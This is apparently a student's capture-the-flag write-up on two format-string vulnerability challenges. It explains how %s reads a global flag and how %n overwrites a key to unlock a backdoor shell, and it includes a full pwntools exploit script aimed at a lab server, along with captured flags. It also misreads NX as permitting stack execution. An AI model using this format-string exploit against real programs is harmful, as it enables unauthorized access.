# CTF - WEEK 7

## Challenge #1

- We need to execute the command 'checksec program', in order to see the definition and information of the file **program**.

![Terminal print of task 1 - checksec](CTFs/Img/Semana7-Desafio1/1.checksec.png)

We can conclude that:

- There is a _canary_ preventing the change of the return address of functions. This canary has a certain values in the beginning of the execution of the function and is located right before the return value. Before it gets to the return address of the function, the _canary_ will compare the value that is at the end of the execution in the canary address with the value stored in the beginning of the execution. If it's different, the stack changed.
- The _stack_ has execution permission (NX) - We can run files that we inject (example, shellcode instructions).
- The position on the binary aren't randomized (PIE) - we can get the addresses
  of variables/registers using a debugger, because the memeory address of all variables don't change.

### Qual é a linha do código onde a vulnerabilidade se encontra?

```c
scanf("%32s", &buffer);
printf("You gave me this: ");
printf(buffer); // vulnerability
```

### O que é que a vulnerabilidade permite fazer?

This vulnerability allows us to read from and write to memory addresses that we arent't supposed to have permissons. As so, this allows us to read the **flag** global variable.

### Qual é a funcionalidade que te permite obter a flag?

By using '%s' on `printf`'s format string, we can read the contents of the flag
char array. To do this, we just need to obtain the address of said variable.

Using the '%s? format string, we ca read the contents of the flag char array. In order to do this, we need the address of the variable flag.

We will use the debugger gdb to get the address of the flag global variable.

### Flag's memory address

![Terminal print of task 1 - _gdb_ debugger](CTFs/Img/Semana7-Desafio1/2.debugger-gdb.png)

- As we can see in the picture above, the address of the flag global variable is **0x804c060**.

### Exploit

![Terminal print of task 1 - exploit_example.py file](CTFs/Img/Semana7-Desafio1/3.exploitFile.png)

- Now, in order to get the flag, we just need to compile the exploit_example.py file and check the result flag.

![Terminal print of task 1 - result (flag)](CTFs/Img/Semana7-Desafio1/4.result_exploit_flag.png)

`flag{5b54eade3016fad2273920d8064491}`

## Desafio #2

### checksec

```
[11/24/21]seed@VM:~/CTF/6$ checksec --file=program --extended
  RELRO : Partial RELRO
  STACK CANARY: Canary found
  NX: NX enabled
  PIE: No PIE
  Clang CFI: No Clang CFI found
  SafeStack: No SafeStack found
  RPATH: No RPATH
  RUNPATH	: No RUNPATH
  Symbols: 79 Symbols
  FORTIFY: Yes
  Fortified: 0
  Fortifiable:  1
  FILE: program
```

### Qual é a linha do código onde a vulnerabilidade se encontra?

```c
scanf("%32s", &buffer);
(...)
printf(buffer); // Vulnerability
```

### O que é que a vulnerabilidade permite fazer?

The vulnerability allows us to change the contents of the `key` variable in
order to access the restricted area of the code.

### A flag é carregada para memória? Ou existe alguma funcionalidade que podemos utilizar para ter acesso à mesma?

The flag is not loaded to memory, but it is present in a file on the target
machine. The functionality that we can exploit to gain access to said file is
obtaining the correct key, activating the backdoor on the server. This spawns a
shell that we can use to read the file contents.

### Para desbloqueares essa funcionalidade o que é que tens de fazer?

To unlock this functionality, we abused the `%n` on `printf`. Our input is
passed as the format string of `printf` without any sanitation. We start by
using `gdb` to obtain the address of the `key` global variable. If we write the
correct number of chars using `printf` (0xbeef), calling `%n` on the key's
correct address will write 0xbeef to it, unlocking the backdoor.

Our buffer isn't big enough to write the needed quantity of chars, so we make
use of number padding to print more characters. This makes it so we can't have
the address of `key` at the beginning of the variable because calling `%`
commands advances `printf`'s pointer forward. We write enough to have printed
0xbeef chars, and then advance the pointer forward to the first available
position that is multiple of 4.

### Exploit

```py
#!/usr/bin/env python3
from pwn import *

LOCAL = False

if LOCAL:
    local = './program'
    p = process(local)
else:
    url = '10.227.243.188'
    port = 4005
    p = remote(url, port)

p.recvuntil(b"...")

content = bytearray(0x00 for i in range(32))
password = 0xbeef

# the -24 is explained below
pad_str = "%0" + str(password - 24) + "x"
content[0:len(pad_str)] = (pad_str).encode('latin-1')

x_str = "%x"
x_len = len(x_str)
n = 3
for i in range(len(pad_str), len(pad_str) + x_len * n, x_len):
    content[i:i+x_len] = (x_str).encode('latin-1')

content[14:16] = ("%n").encode('latin-1')
val = 0x0804c034
content[16:20] = (val).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
  f.write(content)

p.sendline(content)
p.recvuntil(b"You gave")
p.interactive()
```

We subtract 24 from the **password** because the '%x's used print some
characters:

- first '%x' - 38343025 - this one is the one that is left-padded with zeros.
- second '%x' - 78393738
- third '%x' - 78257825
- fourth '%x' - 78256e2578254

If we sum the length of the results of the last 3 '%x', we get 24. These numbers
come from the format string we constructed.

### Flag

`flag{1174a93d4e4fa9e0e19f4cba8ee8d8d8}`

![Acquiring flag from challenge 2](./LOGBOOK6_img/cft_2.png)
